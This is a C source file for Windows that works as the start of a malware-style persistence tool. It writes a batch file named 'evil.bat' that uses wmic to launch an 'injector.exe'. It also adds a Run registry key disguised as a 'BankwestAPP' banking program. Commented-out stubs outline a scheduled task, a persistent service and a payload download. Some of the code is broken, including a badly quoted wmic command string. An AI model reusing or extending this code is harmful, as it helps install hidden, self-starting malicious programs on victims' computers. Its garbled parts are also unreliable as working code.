#include <stdio.h>
#include <windows.h>
#include <fileapi.h>
#include <wininet.h>
#include <stdint.h>
#include <winnt.h>



int main()
{
	const char* dirpath = "c:\\Users\\saurav\\Temp";
	const char* filename = "c:\\Users\\saurav\\Temp\\evil.bat";
    const char* filecontent = "wmic /node:\@\“c:\\Users\\saurav\\Temp\\computer.txt\” process call ‘C:\\Users\\saurav\Desktop\\injector.exe’ /nointeractive\"";


//Create Directory
	BOOL bDir;
	bDir = CreateDirectoryA(dirpath, NULL);
	//char* URL = "https://github.com/lacouls/C/blob/main/textblob";

//Create a File
	HANDLE hfile;
	hfile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("File creation failed\n");
		return 1;
	}
	
//Write to file
    BOOL WrFile;
    long unsigned int byteswritten;
    WrFile = WriteFile(hfile, filecontent, strlen(filecontent), &byteswritten, NULL);

    CloseHandle(hfile);

//Create computer.txt content
system("echo sauravwindowsvi > c:\\Users\\saurav\\Temp\\computer.txt");
    
//Set registry runkey Value - point to bankwestapp.exe


	//char dwdata [] = "bankwestapp.exe";


	HKEY hkey;
	LPCSTR set_string_value = "c:\\Users\\Public\\Temp\\bankwestapp.exe";
	//const char set_string_value [] = {'b','a','n','k','w','e','s','t','\0'};

	//char* subkeyname = "BankwestAPP";

	RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey); //open registry key handle.

	/*
	LSTATUS RegSetValueExW(
		[in]           HKEY       hKey,
		[in, optional] LPCWSTR    lpValueName,
					DWORD      Reserved,
		[in]           DWORD      dwType,
		[in]           const BYTE *lpData,
		[in]           DWORD      cbData
	);
	*/
	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);
	//RegSetKeyValueA(hkey, "Run", "BankwestApp", REG_MULTI_SZ, set_string_value, sizeof(REG_MULTI_SZ));
	
	RegCloseKey(hkey);

	//Create a schtask - to run the filecontent.



	//Create a persistent windows service. 


	/* Open Internet connection
		HINTERNET hinternet_OpenA = InternetOpenA("LovetoConnect_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hinternet == NULL)
		{
			printf("No connection\n");
			
		}
		// Perform internet connection
		HINTERNET hinterent_ConnectA = InternetConnectA(hinternet_OpenA, "github.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		
		//Perform internet open URL
		HINTERNET hinternet_OpenURL = InternetOpenURL(hinterent_ConnectA, 
		
		
		
	Write bytes to file.
		DWORD bytesWritten;
		BOOL wrfile;
		wrfile = (hfile, internet_content, strlen(internet_content), &bytesWritten, NULL);
	*/

	
	return 0;

}
